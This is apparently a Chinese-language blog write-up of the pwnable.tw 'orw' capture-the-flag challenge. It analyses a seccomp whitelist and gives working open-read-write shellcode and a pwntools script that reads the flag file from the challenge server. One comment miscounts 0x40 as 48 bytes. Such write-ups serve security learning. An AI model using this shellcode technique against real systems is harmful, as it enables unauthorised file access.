---
title: "pwnable.tw orw — seccomp 沙盒下的 open-read-write shellcode"
date: "2026-07-20"
category: "PWN"
tags: ["pwn", "pwnable.tw", "shellcode", "seccomp", "orw"]
summary: "程式把輸入當 shellcode 直接執行，但 seccomp 只放行 open/read/write。讀 BPF 白名單、手刻一條 open → read → write 的 shellcode 把 /home/orw/flag 印出來。"
---

## 閱讀過程

### binary 資訊與 IDA 反編譯

這是一個 32bits 的 ELF 然後這個比 Start 的內容還要複雜一些
NX 和 PIE 是關的，但是有偵測到 Canary
可以用 IDA Pro Decomplied
我稍微看了一下呼叫邏輯，我發現主要的戰場應該是 orw_seccomp 和 main

```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  _BYTE *v2; // [esp+8h] [ebp-80h]
  _BYTE v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}

undefined4 main(void)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0,shellcode,200);
  (*(code *)shellcode)();
  return 0;
}
```

### 看懂 seccomp 白名單

emm...
完全看不懂，但是我猜可能也是和 ShellCode 有關
主要是這個 Func Call 我沒有看過

```c
prctl(0x26,1,0,0,0);
prctl(0x16,2,local_88);
```

所以我決定問問我們的 Claude
他說這個是常見的 seccomp 的內容
第一行是鎖定權限，防止提權以及沙盒逃逸
第二行是設置我的 syscall 白名單
用 seccomp-tool dump 出來長這樣

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

這個有一個路由的概念，只要我的 `A` 符合他的內容就可以 ALLOW 那我在這裡可以構建一個鏈
我用偽代碼寫一下

```text
flag = open(/home/orw/flag)
write(flag)
```

### main：定位輸入點

然後 main 的 decomplied 出來的幾乎看不懂他想做什麼
所以我去看他的 ASM 了

```asm
   0x08048548 <+0>:     lea    ecx,[esp+0x4]
   0x0804854c <+4>:     and    esp,0xfffffff0
   0x0804854f <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048552 <+10>:    push   ebp
   0x08048553 <+11>:    mov    ebp,esp
   0x08048555 <+13>:    push   ecx
   0x08048556 <+14>:    sub    esp,0x4
   0x08048559 <+17>:    call   0x80484cb <orw_seccomp>
   0x0804855e <+22>:    sub    esp,0xc
   0x08048561 <+25>:    push   0x80486a0
   0x08048566 <+30>:    call   0x8048380 <printf@plt>
   0x0804856b <+35>:    add    esp,0x10
   0x0804856e <+38>:    sub    esp,0x4
   0x08048571 <+41>:    push   0xc8
   0x08048576 <+46>:    push   0x804a060
   0x0804857b <+51>:    push   0x0
   0x0804857d <+53>:    call   0x8048370 <read@plt>
   0x08048582 <+58>:    add    esp,0x10
   0x08048585 <+61>:    mov    eax,0x804a060
   0x0804858a <+66>:    call   eax
   0x0804858c <+68>:    mov    eax,0x0
   0x08048591 <+73>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:    leave
   0x08048595 <+77>:    lea    esp,[ecx-0x4]
   0x08048598 <+80>:    ret
```

我的習慣是先從輸入點開始看，然後從他和 Decomplied 的代碼結合來看得到了一下資訊：

1. 他輸入的存放點 (就是 decomplied 的 Shellcode 這個 Var) 在 0x804a060 ，而且我可以輸入 200B
2. 然後輸入完之後他 call 0x804a060 ，所以我不用做任何的 Overflow 和 Ret2ShellCode 這一塊

那我是不是就可以開始寫 exp.py 了

## 寫 exp.py

我現在要來實現我剛才的偽代碼了

```asm
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx  // 清空寄存器
mov al, 0x5 // 設置第一個 syscall 為 open
push 0x00006761 //這裡有 Null Byte 可能會導致失敗？反正先試試看吧
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp // 將我想要閱讀的 path: /home/orw/flag 寫入 Stack 並用 ebx 記錄位置
int 0x80 // 這邊轉換成 C 像是 open("/home/orw/flag", 0, 0) 意思是我要 Readonly 而且不存任何檔案
mov ebx, eax // open 會將 return value 傳給 eax 但是他是一個 fd ， fd 是一個令牌， Process 可以通過 fd 和 OS 拿 File ，所以我們還需要一個 read 去講檔案拿回來
mov ecx, esp
mov dl, 0x40
mov al, 0x3 // 將下一個 Syscall 設置為 read
int 0x80 // 轉成 C Belike : read(ebx, esp, 0x40) 那他就會從我剛才 open 回傳的 fd 那裡讀最多 48B 回來存在 esp 的位置，應該是够 flag 了
mov al, 0x4 // 將下一個 Syscall 設置為 write
mov bl, 0x1
mov ecx, esp
mov dl, 0x40
int 0x80 // 轉成 C Belike : write(1, esp, 0x40)
```

跑跑看吧

一發成功
附贈我的 exp.py:

```python
from pwn import *

io = remote('chall.pwnable.tw', 10001)

sc = asm('''
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov al, 0x5
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp
    int 0x80
    mov ebx, eax
    mov ecx, esp
    mov dl, 0x40
    mov al, 0x3
    int 0x80
    mov al, 0x4
    mov bl, 0x1
    mov ecx, esp
    mov dl, 0x40
    int 0x80 
''')

io.recvuntil(b':')
io.send(sc)
output = io.recvall()
log.info(output)
```

Flag:

```text
FLAG{<打碼>}
```
